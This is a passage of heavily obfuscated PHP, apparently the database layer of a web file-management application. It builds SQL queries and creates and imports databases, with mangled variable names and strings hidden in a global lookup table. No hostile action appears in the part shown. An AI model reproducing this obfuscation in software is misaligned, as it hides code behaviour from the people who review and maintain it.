($†é²à™œ as $„´á©²é => $«“¢éæœ) { if (!is_numeric($„´á©²é)) { $ş÷ˆö´Í[] = $this->parseKey($„´á©²é) . $²Ô¡‚ôÆ[53] . $this->parseKey($«“¢éæœ); } else { $ş÷ˆö´Í[] = $this->parseKey($„´á©²é); } } $†é²à™œ = $ş÷ˆö´Í; } elseif (is_string($†é²à™œ)) { if (strstr($†é²à™œ, $²Ô¡‚ôÆ[53])) { return $†é²à™œ; } $†é²à™œ = explode($²Ô¡‚ôÆ[50], $†é²à™œ); array_walk($†é²à™œ, array($this, $²Ô¡‚ôÆ[1002])); } return $²Ô¡‚ôÆ[996] . trim(implode($²Ô¡‚ôÆ[1095], $†é²à™œ), $²Ô¡‚ôÆ[463]) . $²Ô¡‚ôÆ[996]; } protected function parseWhere($ÊŞ¶ø·”) { $ À’¨Å =& $_SERVER[™¸œØ®Ü]; $Š»ãŠœù = $ À’¨Å[12]; if (is_string($ÊŞ¶ø·”)) { $Š»ãŠœù = $ÊŞ¶ø·”; } else { $©•ø…Ñü = isset($ÊŞ¶ø·”[$ À’¨Å[1096]]) ? strtoupper($ÊŞ¶ø·”[$ À’¨Å[1096]]) : $ À’¨Å[12]; if (in_array($©•ø…Ñü, array($ À’¨Å[1097], $ À’¨Å[1098], $ À’¨Å[1099]))) { $©•ø…Ñü = $ À’¨Å[53] . $©•ø…Ñü . $ À’¨Å[53]; unset($ÊŞ¶ø·”[$ À’¨Å[1096]]); } else { $©•ø…Ñü = $ À’¨Å[1100]; } foreach ($ÊŞ¶ø·” as $®¸× õî => $¼Ìó¤õà) { $Š»ãŠœù .= $ À’¨Å[356]; if (is_numeric($®¸× õî)) { $®¸× õî = $ À’¨Å[1101]; } if (0 === strpos($®¸× õî, $ À’¨Å[11])) { $Š»ãŠœù .= $this->parseThinkWhere($®¸× õî, $¼Ìó¤õà); } else { if (!preg_match($ À’¨Å[1102], trim($®¸× õî))) { think_exception(think_lang($ À’¨Å[1103]) . $ À’¨Å[4] . $®¸× õî); } $ÈØÊÏÜ³ = is_array($¼Ìó¤õà) && isset($¼Ìó¤õà[$ À’¨Å[1104]]); $®¸× õî = trim($®¸× õî); if (strpos($®¸× õî, $ À’¨Å[214])) { $»¾ıÛŠŠ = explode($ À’¨Å[214], $®¸× õî); $¡ıªò¤´ = array(); foreach ($»¾ıÛŠŠ as $ã«´É…¾ => $Ûğóİƒƒ) { $¸½»«üÌ = $ÈØÊÏÜ³ ? $¼Ìó¤õà[$ã«´É…¾] : $¼Ìó¤õà; $¡ıªò¤´[] = $ À’¨Å[339] . $this->parseWhereItem($this->parseKey($Ûğóİƒƒ), $¸½»«üÌ) . $ À’¨Å[1001]; } $Š»ãŠœù .= implode($ À’¨Å[1105], $¡ıªò¤´); } elseif (strpos($®¸× õî, $ À’¨Å[286])) { $»¾ıÛŠŠ = explode($ À’¨Å[286], $®¸× õî); $¡ıªò¤´ = array(); foreach ($»¾ıÛŠŠ as $ã«´É…¾ => $Ûğóİƒƒ) { $¸½»«üÌ = $ÈØÊÏÜ³ ? $¼Ìó¤õà[$ã«´É…¾] : $¼Ìó¤õà; $¡ıªò¤´[] = $ À’¨Å[339] . $this->parseWhereItem($this->parseKey($Ûğóİƒƒ), $¸½»«üÌ) . $ À’¨Å[1001]; } $Š»ãŠœù .= implode($ À’¨Å[1100], $¡ıªò¤´); } else { $Š»ãŠœù .= $this->parseWhereItem($this->parseKey($®¸× õî), $¼Ìó¤õà); } } $Š»ãŠœù .= $ À’¨Å[357] . $©•ø…Ñü; } $Š»ãŠœù = substr($Š»ãŠœù, 0, -strlen($©•ø…Ñü)); } return empty($Š»ãŠœù) ? $ À’¨Å[12] : $ À’¨Å[1106] . $Š»ãŠœù; } protected function parseWhereItem($š¬Ûò, $‡²ò‰¶) { $“¢¦—ûÖ =& $_SERVER[™¸œØ®Ü]; $»í¿‚â = $“¢¦—ûÖ[12]; if (is_array($‡²ò‰¶)) { if (is_string($‡²ò‰¶[0])) { $€åÖ•şË = strtolower($‡²ò‰¶[0]); if (in_array($‡²ò‰¶[0], array($“¢¦—ûÖ[508], $“¢¦—ûÖ[1107], $“¢¦—ûÖ[1108], $“¢¦—ûÖ[1109], $“¢¦—ûÖ[1110], $“¢¦—ûÖ[1111]))) { $»í¿‚â .= $š¬Ûò . $“¢¦—ûÖ[53] . $‡²ò‰¶[0] . $“¢¦—ûÖ[53] . $this->parseValue($‡²ò‰¶[1]); } elseif (preg_match($“¢¦—ûÖ[1112], $‡²ò‰¶[0])) { $»í¿‚â .= $š¬Ûò . $“¢¦—ûÖ[53] . $this->exp[$€åÖ•şË] . $“¢¦—ûÖ[53] . $this->parseValue($‡²ò‰¶[1]); } elseif (preg_match($“¢¦—ûÖ[1113], $‡²ò‰¶[0])) { if (is_array($‡²ò‰¶[1])) { $¡ÑäŒó¯ = isset($‡²ò‰¶[2]) ? strtoupper($‡²ò‰¶[2]) : $“¢¦—ûÖ[1098]; if (in_array($¡ÑäŒó¯, array($“¢¦—ûÖ[1097], $“¢¦—ûÖ[1098], $“¢¦—ûÖ[1099]))) { $¨Ÿ¡¨´– = array(); foreach ($‡²ò‰¶[1] as $Î·°Şä¬) { $¨Ÿ¡¨´–[] = $š¬Ûò . $“¢¦—ûÖ[53] . $this->exp[$€åÖ•şË] . $“¢¦—ûÖ[53] . $this->parseValue($Î·°Şä¬); } $»í¿‚â .= $“¢¦—ûÖ[339] . implode($“¢¦—ûÖ[53] . $¡ÑäŒó¯ . $“¢¦—ûÖ[53], $¨Ÿ¡¨´–) . $“¢¦—ûÖ[1001]; } } else { $»í¿‚â .= $š¬Ûò . $“¢¦—ûÖ[53] . $this->exp[$€åÖ•şË] . $“¢¦—ûÖ[53] . $this->parseValue($‡²ò‰¶[1]); } } elseif ($“¢¦—ûÖ[374] == $€åÖ•şË) { $»í¿‚â .= $“¢¦—ûÖ[999] . $š¬Ûò . $“¢¦—ûÖ[53] . $‡²ò‰¶[1] . $“¢¦—ûÖ[1114]; } elseif (preg_match($“¢¦—ûÖ[1115], $‡²ò‰¶[0])) { $»í¿‚â .= $‡²ò‰¶[0]; } elseif (preg_match($“¢¦—ûÖ[1116], $‡²ò‰¶[0])) { if (isset($‡²ò‰¶[2]) && $“¢¦—ûÖ[374] == $‡²ò‰¶[2]) { $»í¿‚â .= $š¬Ûò . $“¢¦—ûÖ[53] . $this->exp[$€åÖ•şË] . $“¢¦—ûÖ[53] . $‡²ò‰¶[1]; } else { if (is_string($‡²ò‰¶[1])) { $‡²ò‰¶[1] = explode($“¢¦—ûÖ[50], $‡²ò‰¶[1]); } $¬ŞöØƒõ = implode($“¢¦—ûÖ[50], $this->parseValue($‡²ò‰¶[1])); $»í¿‚â .= $š¬Ûò . $“¢¦—ûÖ[53] . $this->exp[$€åÖ•şË] . $“¢¦—ûÖ[999] . $¬ŞöØƒõ . $“¢¦—ûÖ[1001]; } } elseif (preg_match($“¢¦—ûÖ[1117], $‡²ò‰¶[0])) { $õ…ÍÆ• = is_string($‡²ò‰¶[1]) ? explode($“¢¦—ûÖ[50], $‡²ò‰¶[1]) : $‡²ò‰¶[1]; $»í¿‚â .= $“¢¦—ûÖ[999] . $š¬Ûò . $“¢¦—ûÖ[53] . $this->exp[$€åÖ•şË] . $“¢¦—ûÖ[53] . $this->parseValue($õ…ÍÆ•[0]) . $“¢¦—ûÖ[1100] . $this->parseValue($õ…ÍÆ•[1]) . $“¢¦—ûÖ[357]; } else { think_exception(think_lang($“¢¦—ûÖ[1103]) . $“¢¦—ûÖ[4] . $‡²ò‰¶[0]); } } else { $Úö¼Ó× = count($‡²ò‰¶); $¹”¬ãÀÙ = $“¢¦—ûÖ[12]; if (is_string($‡²ò‰¶[$Úö¼Ó× - 1])) { $¹”¬ãÀÙ = isset($‡²ò‰¶[$Úö¼Ó× - 1]) ? strtoupper($‡²ò‰¶[$Úö¼Ó× - 1]) : $“¢¦—ûÖ[12]; if (in_array($¹”¬ãÀÙ, array($“¢¦—ûÖ[1097], $“¢¦—ûÖ[1098], $“¢¦—ûÖ[1099]))) { $Úö¼Ó× = $Úö¼Ó× - 1; } } else { $¹”¬ãÀÙ = $“¢¦—ûÖ[1097]; } for ($şÜ€ŞÑ = 0; $şÜ€ŞÑ < $Úö¼Ó×; $şÜ€ŞÑ++) { $õ…ÍÆ• = is_array($‡²ò‰¶[$şÜ€ŞÑ]) ? $‡²ò‰¶[$şÜ€ŞÑ][1] : $‡²ò‰¶[$şÜ€ŞÑ]; if ($“¢¦—ûÖ[374] == strtolower($‡²ò‰¶[$şÜ€ŞÑ][0])) { $»í¿‚â .= $“¢¦—ûÖ[339] . $š¬Ûò . $“¢¦—ûÖ[53] . $õ…ÍÆ• . $“¢¦—ûÖ[1114] . $¹”¬ãÀÙ . $“¢¦—ûÖ[53]; } else { $Ï°‹°êã = is_array($‡²ò‰¶[$şÜ€ŞÑ]) ? $this->exp[strtolower($‡²ò‰¶[$şÜ€ŞÑ][0])] : $“¢¦—ûÖ[508]; if (!$Ï°‹°êã && is_array($‡²ò‰¶[$şÜ€ŞÑ]) && in_array($‡²ò‰¶[$şÜ€ŞÑ][0], array($“¢¦—ûÖ[508], $“¢¦—ûÖ[1107], $“¢¦—ûÖ[1108], $“¢¦—ûÖ[1109], $“¢¦—ûÖ[1110], $“¢¦—ûÖ[1111]))) { $Ï°‹°êã = $‡²ò‰¶[$şÜ€ŞÑ][0]; } $»í¿‚â .= $“¢¦—ûÖ[339] . $š¬Ûò . $“¢¦—ûÖ[53] . $Ï°‹°êã . $“¢¦—ûÖ[53] . $this->parseValue($õ…ÍÆ•) . $“¢¦—ûÖ[1114] . $¹”¬ãÀÙ . $“¢¦—ûÖ[53]; } } $»í¿‚â = substr($»í¿‚â, 0, -4); } } else { $»í¿‚â .= $š¬Ûò . $“¢¦—ûÖ[1118] . $this->parseValue($‡²ò‰¶); } return $»í¿‚â; } protected function parseThinkWhere($æ´ä·é, $Èº‹¥ğÔ) { $åã¼¹¼ =& $_SERVER[™¸œØ®Ü]; $äÛÁ­Ä“ = $åã¼¹¼[12]; switch ($æ´ä·é) { case $åã¼¹¼[429]: $äÛÁ­Ä“ = $Èº‹¥ğÔ; break; case $åã¼¹¼[1101]: $äÛÁ­Ä“ = is_string($Èº‹¥ğÔ) ? $Èº‹¥ğÔ : substr($this->parseWhere($Èº‹¥ğÔ), 6); break; case $åã¼¹¼[1119]: parse_str($Èº‹¥ğÔ, $Œ˜İ¥Ä ); if (isset($Œ˜İ¥Ä [$åã¼¹¼[1096]])) { $ùáë˜§° = $åã¼¹¼[53] . strtoupper($Œ˜İ¥Ä [$åã¼¹¼[1096]]) . $åã¼¹¼[53]; unset($Œ˜İ¥Ä [$åã¼¹¼[1096]]); } else { $ùáë˜§° = $åã¼¹¼[1100]; } $€¥ºÕöà = array(); foreach ($Œ˜İ¥Ä  as $°ÓŞ‚œÀ => $º›ˆò–) { $€¥ºÕöà[] = $this->parseKey($°ÓŞ‚œÀ) . $åã¼¹¼[1118] . $this->parseValue($º›ˆò–); } $äÛÁ­Ä“ = implode($ùáë˜§°, $€¥ºÕöà); break; } return $äÛÁ­Ä“; } protected function parseLimit($’Óˆ¤Äó) { $ğçÊ™í =& $_SERVER[™¸œØ®Ü]; return !empty($’Óˆ¤Äó) ? $ğçÊ™í[51] . $’Óˆ¤Äó . $ğçÊ™í[53] : $ğçÊ™í[12]; } protected function parseJoin($ñÏ ¨å´) { $Ë¨÷£ì± =& $_SERVER[™¸œØ®Ü]; $“Üœû›‹ = $Ë¨÷£ì±[12]; if (!empty($ñÏ ¨å´)) { if (is_array($ñÏ ¨å´)) { foreach ($ñÏ ¨å´ as $‰€˜ò† => $àÊ–ãíÏ) { if (!1 !== stripos($àÊ–ãíÏ, $Ë¨÷£ì±[1120])) { $“Üœû›‹ .= $Ë¨÷£ì±[53] . $àÊ–ãíÏ; } else { $“Üœû›‹ .= $Ë¨÷£ì±[1121] . $àÊ–ãíÏ; } } } else { $“Üœû›‹ .= $Ë¨÷£ì±[1121] . $ñÏ ¨å´; } } $“Üœû›‹ = preg_replace($Ë¨÷£ì±[1122], think_config($Ë¨÷£ì±[1026]) . $Ë¨÷£ì±[1123], $“Üœû›‹); return $“Üœû›‹; } protected function parseOrder($‘®ğœ•) { $ùèèëãë =& $_SERVER[™¸œØ®Ü]; if (is_array($‘®ğœ•)) { $‹©¢Ó = array(); foreach ($‘®ğœ• as $øÍ§†° => $÷§»ôŠá) { if (is_numeric($øÍ§†°)) { $‹©¢Ó[] = $this->parseKey($÷§»ôŠá); } else { $÷§»ôŠá = in_array(strtoupper(trim($÷§»ôŠá)), array($ùèèëãë[1124], $ùèèëãë[1125])) ? $ùèèëãë[53] . $÷§»ôŠá : $ùèèëãë[12]; if (preg_match($ùèèëãë[1126], $øÍ§†°)) { $‹©¢Ó[] = $this->parseKey($øÍ§†°) . $÷§»ôŠá; } else { think_exception($ùèèëãë[1127] . $øÍ§†°); } } } $‘®ğœ• = implode($ùèèëãë[50], $‹©¢Ó); } return !empty($‘®ğœ•) ? $ùèèëãë[1128] . $‘®ğœ• : $ùèèëãë[12]; } protected function parseGroup($±Ãª•ÛÄ) { $ì–‡š„¯ =& $_SERVER[™¸œØ®Ü]; return !empty($±Ãª•ÛÄ) ? $ì–‡š„¯[1129] . $±Ãª•ÛÄ : $ì–‡š„¯[12]; } protected function parseHaving($êğ¸ë¹²) { $Ï¢â¯‚¶ =& $_SERVER[™¸œØ®Ü]; return !empty($êğ¸ë¹²) ? $Ï¢â¯‚¶[1130] . $êğ¸ë¹² : $Ï¢â¯‚¶[12]; } protected function parseComment($Ü¢ã×Ò´) { $¾ñ‘“­Ş =& $_SERVER[™¸œØ®Ü]; return !empty($Ü¢ã×Ò´) ? $¾ñ‘“­Ş[1131] . $Ü¢ã×Ò´ . $¾ñ‘“­Ş[1132] : $¾ñ‘“­Ş[12]; } protected function parseDistinct($Õµ®Îªå) { $ŠÕ¹íÇÌ =& $_SERVER[™¸œØ®Ü]; return !empty($Õµ®Îªå) ? $ŠÕ¹íÇÌ[1133] : $ŠÕ¹íÇÌ[12]; } protected function parseUnion($ÎÜ¯Ãç¿) { $·¹ä—± =& $_SERVER[™¸œØ®Ü]; if (empty($ÎÜ¯Ãç¿)) { return $·¹ä—±[12]; } if (isset($ÎÜ¯Ãç¿[$·¹ä—±[425]])) { $Ø’İìÂÚ = $·¹ä—±[1134]; unset($ÎÜ¯Ãç¿[$·¹ä—±[425]]); } else { $Ø’İìÂÚ = $·¹ä—±[1135]; } foreach ($ÎÜ¯Ãç¿ as $ğòÊ¤ÔÊ) { $Ê„üàÅ¬[] = $Ø’İìÂÚ . (is_array($ğòÊ¤ÔÊ) ? $this->buildSelectSql($ğòÊ¤ÔÊ) : $ğòÊ¤ÔÊ); } return implode($·¹ä—±[53], $Ê„üàÅ¬); } public function insert($“îù÷­Ó, $´áü™ÓÛ = array(), $ò¶ÍéˆŸ = false) { $‡ÉÃ‰ñß =& $_SERVER[™¸œØ®Ü]; $‹–÷§ùÎ = $†È±Ã¬ = array(); $this->model = $´áü™ÓÛ[$‡ÉÃ‰ñß[360]]; foreach ($“îù÷­Ó as $Ï›€Ò => $êÍ’â•) { if (is_array($êÍ’â•) && $‡ÉÃ‰ñß[374] == $êÍ’â•[0]) { $†È±Ã¬[] = $this->parseKey($Ï›€Ò); $‹–÷§ùÎ[] = $êÍ’â•[1]; } elseif (is_scalar($êÍ’â•) || is_null($êÍ’â•)) { $†È±Ã¬[] = $this->parseKey($Ï›€Ò); $‹–÷§ùÎ[] = $this->parseValue($êÍ’â•); } } $¡§ıÒúº = ($ò¶ÍéˆŸ ? $‡ÉÃ‰ñß[1003] : $‡ÉÃ‰ñß[1004]) . $‡ÉÃ‰ñß[1005] . $this->parseTable($´áü™ÓÛ[$‡ÉÃ‰ñß[358]]) . $‡ÉÃ‰ñß[999] . implode($‡ÉÃ‰ñß[50], $†È±Ã¬) . $‡ÉÃ‰ñß[1000] . implode($‡ÉÃ‰ñß[50], $‹–÷§ùÎ) . $‡ÉÃ‰ñß[1001]; $¡§ıÒúº .= $this->parseLock(isset($´áü™ÓÛ[$‡ÉÃ‰ñß[934]]) ? $´áü™ÓÛ[$‡ÉÃ‰ñß[934]] : !1); $¡§ıÒúº .= $this->parseComment(!empty($´áü™ÓÛ[$‡ÉÃ‰ñß[431]]) ? $´áü™ÓÛ[$‡ÉÃ‰ñß[431]] : $‡ÉÃ‰ñß[12]); return $this->execute($¡§ıÒúº, $this->parseBind(!empty($´áü™ÓÛ[$‡ÉÃ‰ñß[362]]) ? $´áü™ÓÛ[$‡ÉÃ‰ñß[362]] : array())); } public function selectInsert($µ§éä¼Ì, $ªùÉÆ±, $¨Ç¢œµ˜ = array()) { $ùí ÈÎÌ =& $_SERVER[™¸œØ®Ü]; $this->model = $¨Ç¢œµ˜[$ùí ÈÎÌ[360]]; if (is_string($µ§éä¼Ì)) { $µ§éä¼Ì = explode($ùí ÈÎÌ[50], $µ§éä¼Ì); } array_walk($µ§éä¼Ì, array($this, $ùí ÈÎÌ[1002])); $•Ì¤ìœõ = $ùí ÈÎÌ[1136] . $this->parseTable($ªùÉÆ±) . $ùí ÈÎÌ[999] . implode($ùí ÈÎÌ[50], $µ§éä¼Ì) . $ùí ÈÎÌ[1114]; $•Ì¤ìœõ .= $this->buildSelectSql($¨Ç¢œµ˜); return $this->execute($•Ì¤ìœõ, $this->parseBind(!empty($¨Ç¢œµ˜[$ùí ÈÎÌ[362]]) ? $¨Ç¢œµ˜[$ùí ÈÎÌ[362]] : array())); } public function update($Æ¯Æì, $ñüîÍÚØ) { $‚½³ØÎÚ =& $_SERVER[™¸œØ®Ü]; $this->model = $ñüîÍÚØ[$‚½³ØÎÚ[360]]; $ Åè„Øí = $‚½³ØÎÚ[1137] . $this->parseTable($ñüîÍÚØ[$‚½³ØÎÚ[358]]) . $this->parseSet($Æ¯Æì) . $this->parseWhere(!empty($ñüîÍÚØ[$‚½³ØÎÚ[354]]) ? $ñüîÍÚØ[$‚½³ØÎÚ[354]] : $‚½³ØÎÚ[12]) . $this->parseOrder(!empty($ñüîÍÚØ[$‚½³ØÎÚ[443]]) ? $ñüîÍÚØ[$‚½³ØÎÚ[443]] : $‚½³ØÎÚ[12]) . $this->parseLimit(!empty($ñüîÍÚØ[$‚½³ØÎÚ[369]]) ? $ñüîÍÚØ[$‚½³ØÎÚ[369]] : $‚½³ØÎÚ[12]) . $this->parseLock(isset($ñüîÍÚØ[$‚½³ØÎÚ[934]]) ? $ñüîÍÚØ[$‚½³ØÎÚ[934]] : !1) . $this->parseComment(!empty($ñüîÍÚØ[$‚½³ØÎÚ[431]]) ? $ñüîÍÚØ[$‚½³ØÎÚ[431]] : $‚½³ØÎÚ[12]); return $this->execute($ Åè„Øí, $this->parseBind(!empty($ñüîÍÚØ[$‚½³ØÎÚ[362]]) ? $ñüîÍÚØ[$‚½³ØÎÚ[362]] : array())); } public function delete($å”ğğ»¢ = array()) { $¯ôèŠ¿ =& $_SERVER[™¸œØ®Ü]; $this->model = $å”ğğ»¢[$¯ôèŠ¿[360]]; $ü‹şø¤ş = $¯ôèŠ¿[1138] . $this->parseTable($å”ğğ»¢[$¯ôèŠ¿[358]]) . $this->parseWhere(!empty($å”ğğ»¢[$¯ôèŠ¿[354]]) ? $å”ğğ»¢[$¯ôèŠ¿[354]] : $¯ôèŠ¿[12]) . $this->parseOrder(!empty($å”ğğ»¢[$¯ôèŠ¿[443]]) ? $å”ğğ»¢[$¯ôèŠ¿[443]] : $¯ôèŠ¿[12]) . $this->parseLimit(!empty($å”ğğ»¢[$¯ôèŠ¿[369]]) ? $å”ğğ»¢[$¯ôèŠ¿[369]] : $¯ôèŠ¿[12]) . $this->parseLock(isset($å”ğğ»¢[$¯ôèŠ¿[934]]) ? $å”ğğ»¢[$¯ôèŠ¿[934]] : !1) . $this->parseComment(!empty($å”ğğ»¢[$¯ôèŠ¿[431]]) ? $å”ğğ»¢[$¯ôèŠ¿[431]] : $¯ôèŠ¿[12]); return $this->execute($ü‹şø¤ş, $this->parseBind(!empty($å”ğğ»¢[$¯ôèŠ¿[362]]) ? $å”ğğ»¢[$¯ôèŠ¿[362]] : array())); } public function select($¤Îà’¯¦ = array()) { $øùÕèïá =& $_SERVER[™¸œØ®Ü]; $this->model = $¤Îà’¯¦[$øùÕèïá[360]]; $áÑ¼Ò¥° = $this->buildSelectSql($¤Îà’¯¦); $ñàãÌàá = isset($¤Îà’¯¦[$øùÕèïá[426]]) ? $¤Îà’¯¦[$øùÕèïá[426]] : !1; if ($ñàãÌàá) { $ıšÏÛ«’ = is_string($ñàãÌàá[$øùÕèïá[97]]) ? $ñàãÌàá[$øùÕèïá[97]] : $øùÕèïá[1139] . md5($áÑ¼Ò¥°); $–£óáØ = think_cache($ıšÏÛ«’, $øùÕèïá[12], $ñàãÌàá); if (!1 !== $–£óáØ) { return $–£óáØ; } } $”Ç‰Ûã = $this->query($áÑ¼Ò¥°, $this->parseBind(!empty($¤Îà’¯¦[$øùÕèïá[362]]) ? $¤Îà’¯¦[$øùÕèïá[362]] : array())); if ($ñàãÌàá && !1 !== $”Ç‰Ûã) { think_cache($ıšÏÛ«’, $”Ç‰Ûã, $ñàãÌàá); } return $”Ç‰Ûã; } public function buildSelectSql($›˜ß©æç = array()) { $ì¨š•Ã¼ =& $_SERVER[™¸œØ®Ü]; if (isset($›˜ß©æç[$ì¨š•Ã¼[430]])) { if (strpos($›˜ß©æç[$ì¨š•Ã¼[430]], $ì¨š•Ã¼[50])) { list($‚…ù¾—½, $şŒê¥€ú) = explode($ì¨š•Ã¼[50], $›˜ß©æç[$ì¨š•Ã¼[430]]); } else { $‚…ù¾—½ = $›˜ß©æç[$ì¨š•Ã¼[430]]; } $‚…ù¾—½ = $‚…ù¾—½ ? $‚…ù¾—½ : 1; $şŒê¥€ú = isset($şŒê¥€ú) ? $şŒê¥€ú : (is_numeric($›˜ß©æç[$ì¨š•Ã¼[369]]) ? $›˜ß©æç[$ì¨š•Ã¼[369]] : 20); $¶Û‹Î“Î = $şŒê¥€ú * ((int) $‚…ù¾—½ - 1); $›˜ß©æç[$ì¨š•Ã¼[369]] = $¶Û‹Î“Î . $ì¨š•Ã¼[50] . $şŒê¥€ú; } if (think_config($ì¨š•Ã¼[1140])) { $ü½Õ¹Ö° = $ì¨š•Ã¼[1141] . md5(serialize($›˜ß©æç)); $ŞÒ§Šñ = think_cache($ü½Õ¹Ö°); if ($ŞÒ§Šñ) { return $ŞÒ§Šñ; } } $ıÆ‹É¢å = $this->parseSql($this->selectSql, $›˜ß©æç); $ıÆ‹É¢å .= $this->parseLock(isset($›˜ß©æç[$ì¨š•Ã¼[934]]) ? $›˜ß©æç[$ì¨š•Ã¼[934]] : !1); if (isset($ü½Õ¹Ö°)) { think_cache($ü½Õ¹Ö°, $ıÆ‹É¢å); } return $ıÆ‹É¢å; } public function parseSql($Í—¬¶ëú, $‚Å§İºÉ = array()) { $”¿İá«ë =& $_SERVER[™¸œØ®Ü]; $Í—¬¶ëú = str_replace(array($”¿İá«ë[1142], $”¿İá«ë[1143], $”¿İá«ë[1144], $”¿İá«ë[1145], $”¿İá«ë[1146], $”¿İá«ë[1147], $”¿İá«ë[1148], $”¿İá«ë[1149], $”¿İá«ë[1150], $”¿İá«ë[1151], $”¿İá«ë[1152]), array($this->parseTable("{$‚Å§İºÉ[$”¿İá«ë[358]]}"), $this->parseDistinct(isset($‚Å§İºÉ[$”¿İá«ë[1153]]) ? $‚Å§İºÉ[$”¿İá«ë[1153]] : !1), $this->parseField(!empty($‚Å§İºÉ[$”¿İá«ë[352]]) ? $‚Å§İºÉ[$”¿İá«ë[352]] : $”¿İá«ë[222]), $this->parseJoin(!empty($‚Å§İºÉ[$”¿İá«ë[361]]) ? $‚Å§İºÉ[$”¿İá«ë[361]] : $”¿İá«ë[12]), $this->parseWhere(!empty($‚Å§İºÉ[$”¿İá«ë[354]]) ? $‚Å§İºÉ[$”¿İá«ë[354]] : $”¿İá«ë[12]), $this->parseGroup(!empty($‚Å§İºÉ[$”¿İá«ë[582]]) ? $‚Å§İºÉ[$”¿İá«ë[582]] : $”¿İá«ë[12]), $this->parseHaving(!empty($‚Å§İºÉ[$”¿İá«ë[1154]]) ? $‚Å§İºÉ[$”¿İá«ë[1154]] : $”¿İá«ë[12]), $this->parseOrder(!empty($‚Å§İºÉ[$”¿İá«ë[443]]) ? $‚Å§İºÉ[$”¿İá«ë[443]] : $”¿İá«ë[12]), $this->parseLimit(!empty($‚Å§İºÉ[$”¿İá«ë[369]]) ? $‚Å§İºÉ[$”¿İá«ë[369]] : $”¿İá«ë[12]), $this->parseUnion(!empty($‚Å§İºÉ[$”¿İá«ë[424]]) ? $‚Å§İºÉ[$”¿İá«ë[424]] : $”¿İá«ë[12]), $this->parseComment(!empty($‚Å§İºÉ[$”¿İá«ë[431]]) ? $‚Å§İºÉ[$”¿İá«ë[431]] : $”¿İá«ë[12])), $Í—¬¶ëú); return $Í—¬¶ëú; } public function getLastSql($æŸ¾ß = '') { return $æŸ¾ß ? $this->modelSql[$æŸ¾ß] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($•‰›¤¶™) { return addslashes($•‰›¤¶™); } public function setModel($õã¸§€›) { $this->model = $õã¸§€›; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($‹ğ”úŞ = array()) { $—†–÷˜À =& $_SERVER[™¸œØ®Ü]; if (empty($‹ğ”úŞ)) { $‹ğ”úŞ = $GLOBALS[$—†–÷˜À[6]][$—†–÷˜À[21]]; } $this->database = $‹ğ”úŞ; } public function model($ğÅÎ€ìë = '') { return new ModelBase($ğÅÎ€ìë, $_SERVER[™¸œØ®Ü][12], $this->database); } public function db($«çÑÈŒ· = false) { $³í ÍÕ =& $_SERVER[™¸œØ®Ü]; $ü—Ã›ö¢ = array_change_key_case($this->database); if ($this->dbType() == $³í ÍÕ[13] || !$«çÑÈŒ·) { return $this->model()->db(); } $ÃÑŸœÅ = $ü—Ã›ö¢[$³í ÍÕ[1068]]; $ü—Ã›ö¢[$³í ÍÕ[1068]] = $³í ÍÕ[12]; if ($ü—Ã›ö¢[$³í ÍÕ[1063]] == $³í ÍÕ[1060]) { $²«¾…ó = $ü—Ã›ö¢[$³í ÍÕ[1069]]; $ü—Ã›ö¢[$³í ÍÕ[1069]] = substr($²«¾…ó, 0, strrpos($²«¾…ó, $³í ÍÕ[1155])); } $this->database = $ü—Ã›ö¢; $ÑÓûÊ¥– = $this->model()->db(); try { $Î§ã÷îñ = $ÑÓûÊ¥–->execute("\163\150\157\x77\x20\144\141\x74\x61\x62\141\x73\x65\163\x20\x6c\x69\x6b\145\x20\47{$ÃÑŸœÅ}\x27"); } catch (Exception $íÉ¢öÚÄ) { } if (!$Î§ã÷îñ) { $ÑÓûÊ¥–->execute("\x63\x72\145\141\x74\x65\40\144\x61\x74\141\142\x61\x73\145\40\140{$ÃÑŸœÅ}\x60"); } $ü—Ã›ö¢[$³í ÍÕ[1068]] = $ÃÑŸœÅ; if ($ü—Ã›ö¢[$³í ÍÕ[1063]] == $³í ÍÕ[1060]) { $ü—Ã›ö¢[$³í ÍÕ[1069]] .= $³í ÍÕ[1155] . $ÃÑŸœÅ; } $this->database = $ü—Ã›ö¢; $ÑÓûÊ¥–->execute("\x75\x73\145\40\x60{$ÃÑŸœÅ}\140"); return $ÑÓûÊ¥–; } public function createTable($†÷£Ïà, &$âğ©¦Ç—) { $Úù—ƒÎ´ =& $_SERVER[™¸œØ®Ü]; if (!IO::exist($†÷£Ïà)) { ActionCall($Úù—ƒÎ´[1156], !0, 0); show_json(LNG($Úù—ƒÎ´[1157]), !1); } $ö¶Ï§ô = $this->model()->db(); $á¸½§ÎÛ = sqlSplit(IO::getContent($†÷£Ïà)); foreach ($á¸½§ÎÛ as $ÓÒ†è¶) { $—ãÉ‹— = stripos($ÓÒ†è¶, $Úù—ƒÎ´[1158]) === 0; if ($—ãÉ‹—) { $âğ©¦Ç—->task[$Úù—ƒÎ´[1159]] += 1; } $ö¶Ï§ô->execute($ÓÒ†è¶); if ($—ãÉ‹—) { preg_match($Úù—ƒÎ´[1160], $ÓÒ†è¶, $­•İÖçø); $âğ©¦Ç—->task[$Úù—ƒÎ´[1161]] = $­•İÖçø[1]; $âğ©¦Ç—->update(1); } } } public function insertTable($ù–·€óÔ, &$ñßÓúÅÇ) { $„ë¿˜ğœ =& $_SERVER[™¸œØ®Ü]; $ç –ë™ = $this->model()->db(); $á¨¥Ÿ‡‰ = $ŞÛÕñÁ‚ ? array($ŞÛÕñÁ‚) : $ç –ë™->getTables(); foreach ($ù–·€óÔ as $®é²ˆşì) { $ŞÛÕñÁ‚ = basename($®é²ˆşì, $„ë¿˜ğœ[875]); if (!in_array($ŞÛÕñÁ‚, $á¨¥Ÿ‡‰)) { continue; } $ñßÓúÅÇ->task[$„ë¿˜ğœ[1161]] = $ŞÛÕñÁ‚; if (get_filesize($®é²ˆşì) == 0) { continue; } $º½ıÚÙÍ = $this->sqlToDb($®é²ˆşì, $ñßÓúÅÇ); if (!$º½ıÚÙÍ) { ActionCall($„ë¿˜ğœ[1156], !0, 0); show_json(LNG($„ë¿˜ğœ[1162]) . "\133{$ŞÛÕñÁ‚}\135", !1); } } } public function sqlFromDb($è•¼½Æ, $•½ñú‰, &$³µñµ™Ö, $»Ì™¡í = '') { if ($³µñµ™Ö) { $³µñµ™Ö->task[$_SERVER[™¸œØ®Ü][1161]] = $è•¼½Æ; } $“ï¹ƒ¬ = $this->model($è•¼½Æ); 